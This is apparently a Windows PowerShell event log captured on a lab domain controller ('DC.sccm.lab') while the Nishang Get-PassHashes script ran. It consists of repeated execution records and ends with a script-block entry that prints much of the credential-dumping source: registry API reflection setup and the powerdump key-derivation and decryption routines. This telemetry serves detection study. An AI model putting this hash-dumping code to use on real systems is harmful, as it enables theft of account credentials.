        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 70
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.460766600Z" />
    <EventRecordID>14216</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-533b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 70
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 68
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.449225100Z" />
    <EventRecordID>14215</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-523b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 68
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Reflection.Emit.CustomAttributeBuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="Void .ctor(System.String), System.Object[], System.Reflection.FieldInfo[], System.Object[]"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 66
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.422209100Z" />
    <EventRecordID>14214</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-4e3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 66
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Reflection.Emit.CustomAttributeBuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="Void .ctor(System.String), System.Object[], System.Reflection.FieldInfo[], System.Object[]"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Reflection.Emit.CustomAttributeBuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="Void .ctor(System.String), System.Object[], System.Reflection.FieldInfo[], System.Object[]"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 64
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.421999600Z" />
    <EventRecordID>14213</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-4d3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 64
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Reflection.Emit.CustomAttributeBuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="Void .ctor(System.String), System.Object[], System.Reflection.FieldInfo[], System.Object[]"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Reflection.Emit.CustomAttributeBuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="Void .ctor(System.String), System.Object[], System.Reflection.FieldInfo[], System.Object[]"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 62
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.418822600Z" />
    <EventRecordID>14212</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-4c3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 62
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Reflection.Emit.CustomAttributeBuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="Void .ctor(System.String), System.Object[], System.Reflection.FieldInfo[], System.Object[]"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Reflection.AssemblyName"
ParameterBinding(New-Object): name="ArgumentList"; value="Win32Lib"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 60
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.389028500Z" />
    <EventRecordID>14211</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-4b3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 60
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Reflection.AssemblyName"
ParameterBinding(New-Object): name="ArgumentList"; value="Win32Lib"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(New-Object): name="ArgumentList"; value="SCCMLAB\vagrant, FullControl, ContainerInherit, ObjectInherit, None, Allow"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 58
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.375640600Z" />
    <EventRecordID>14210</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-c83a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 58
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(New-Object): name="ArgumentList"; value="SCCMLAB\vagrant, FullControl, ContainerInherit, ObjectInherit, None, Allow"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4104
Task Category: Execute a Remote Command
Level:         Warning
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
Creating Scriptblock text (1 of 1):
function Get-PassHashes { 
<# 
.SYNOPSIS 
Nishang payload which dumps password hashes. 
 
.DESCRIPTION 
The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
(but not SYSTEM privs as for the original powerdump written by David Kennedy)

.EXAMPLE 
PS > Get-PassHashes
Run above from an elevated shell.


.EXAMPLE 
PS > Get-PassHashes -PSObjectFormat
Use above to receive the hashes output as a PSObject.
 
.LINK 
http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
https://github.com/samratashok/nishang

.Notes
Reflection added by https://github.com/Zer1t0

#> 
[CmdletBinding()]
Param (
    [Switch]$PSObjectFormat
)

$script:PowerDump = $null
function LoadApi
{
    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')

    #######################################################################
    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    # public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegOpenKeyEx',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )
    $FieldValueArray = [Object[]] @(
        'RegOpenKeyEx',
        [Runtime.InteropServices.CharSet]::Auto
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ##########################################################################
    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    #extern public static int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegQueryInfoKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegQueryInfoKey',
        [Runtime.InteropServices.CallingConvention]::Winapi,
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ###############################################################################
    #[DllImport("advapi32.dll", SetLastError=true)]
    #public static extern int RegCloseKey(int hKey);
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegCloseKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegCloseKey',
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ################################################################################
    
    $script:PowerDump = $TypeBuilder.CreateType()
}

#######################################powerdump written by David Kennedy#########################################

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $c0 = $sid -band 255
    $c1 = ($sid -band 65280)/256
    $c2 = ($sid -band 16711680)/65536
    $c3 = ($sid -band 4278190080)/16777216

    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

    return ,((str_to_key $s1),(str_to_key $s2))
}

function str_to_key($s)
{
    $k0 = [int][math]::Floor($s[0] * 0.5)
    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
    $k7 = $($s[6] -band 0x7F)

    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

    0..7 | %{
        $key[$_] = $odd_parity[($key[$_] * 2)]
    }

    return ,$key
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
